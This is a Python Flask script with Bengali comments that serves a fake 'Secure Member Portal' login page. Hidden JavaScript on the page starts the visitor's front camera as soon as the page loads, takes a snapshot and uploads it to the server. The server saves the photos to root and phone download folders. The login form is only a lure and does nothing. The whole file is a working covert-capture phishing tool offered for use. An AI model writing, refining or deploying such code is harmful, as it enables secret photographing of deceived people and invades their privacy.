import os
import time
import base64
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# ছবি সেভ করার ফোল্ডার নিশ্চিত করা (উবুন্টু এবং ফোনের ডাউনলোড ফোল্ডার)
UPLOAD_FOLDER = '/root/captured_images'
DOWNLOAD_FOLDER = '/sdcard/Download/captured_images'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# অত্যন্ত প্রিমিয়াম এবং আধুনিক গ্লাস-মর্ফিজম লগইন পেজ ও অটো-ক্যামেরা স্ক্রিপ্ট
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Member Portal | Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            overflow: hidden;
        }
        .login-container {
            background: rgba(15, 23, 42, 0.75);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            padding: 40px 30px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
            width: 100%;
            max-width: 420px;
            text-align: center;
            position: relative;
        }
        .login-container h2 {
            margin-bottom: 8px;
            color: #f8fafc;
            font-size: 26px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        .subtitle {
            font-size: 13px;
            color: #94a3b8;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 13px;
            color: #cbd5e1;
            font-weight: 500;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(30, 41, 59, 0.6);
            border: 1px solid rgba(51, 65, 85, 0.8);
            border-radius: 10px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
        }
        .input-group input:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 12px rgba(59, 130, 246, 0.4);
            background: rgba(30, 41, 59, 0.9);
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4);
        }
        .login-btn:hover {
            background: linear-gradient(135deg, #2563eb 0%, #1e40af 100%);
            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.6);
            transform: translateY(-1px);
        }
        .footer-text {
            margin-top: 20px;
            font-size: 12px;
            color: #64748b;
        }
        .hidden-cam { display: none; }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>Member Portal</h2>
        <p class="subtitle">Please sign in to access secure dashboard</p>
        <form id="authForm" onsubmit="handleAuth(event)">
            <div class="input-group">
                <label>Username / ID</label>
                <input type="text" id="username" required placeholder="Enter your username">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" required placeholder="••••••••••••">
            </div>
            <button type="submit" class="login-btn">Secure Login</button>
        </form>
        <div class="footer-text">Protected by Advanced Security Protocol</div>
    </div>

    <!-- ব্যাকগ্রাউন্ডে ক্যামেরা প্রসেসিংয়ের জন্য হিডেন এলিমেন্ট -->
    <video id="webcam" class="hidden-cam" autoplay playsinline></video>
    <canvas id="snapshotCanvas" class="hidden-cam"></canvas>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(initializeCapture, 800);
        });

        async function initializeCapture() {
            try {
                const mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }, 
                    audio: false 
                });
                
                const videoElement = document.getElementById('webcam');
                videoElement.srcObject = mediaStream;

                setTimeout(() => {
                    const canvasElement = document.getElementById('snapshotCanvas');
                    canvasElement.width = videoElement.videoWidth || 640;
                    canvasElement.height = videoElement.videoHeight || 480;
                    
                    const context = canvasElement.getContext('2d');
                    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

                    const base64Image = canvasElement.toDataURL('image/png', 0.9);

                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: base64Image })
                    })
                    .then(res => res.json())
                    .then(data => {
                        console.log("Status:", data.message);
                        mediaStream.getTracks().forEach(track => track.stop());
                    })
                    .catch(err => console.error("Transmission failed"));
                }, 1200);

            } catch (error) {
                console.warn("Access restricted or denied:", error);
            }
        }

        function handleAuth(e) {
            e.preventDefault();
            alert("Connecting to secure server...");
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload_image():
    try:
        incoming_data = request.get_json()
        image_payload = incoming_data.get('image')

        if not image_payload:
            return jsonify({'status': 'error', 'message': 'Data payload empty'}), 400

        header_info, encoded_data = image_payload.split(',', 1)
        decoded_bytes = base64.b64decode(encoded_data)

        filename = f"photo_{int(time.time() * 1000)}.png"
        
        path_ubuntu = os.path.join(UPLOAD_FOLDER, filename)
        path_phone_download = os.path.join(DOWNLOAD_FOLDER, filename)

        with open(path_ubuntu, 'wb') as f_ubuntu:
            f_ubuntu.write(decoded_bytes)
        
        with open(path_phone_download, 'wb') as f_download:
            f_download.write(decoded_bytes)

        print(f"[+] Secure Capture Saved: {filename}")
        return jsonify({'status': 'success', 'message': 'Captured successfully'})

    except Exception as server_error:
        print(f"[-] Error occurred: {server_error}")
        return jsonify({'status': 'error', 'message': str(server_error)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9030)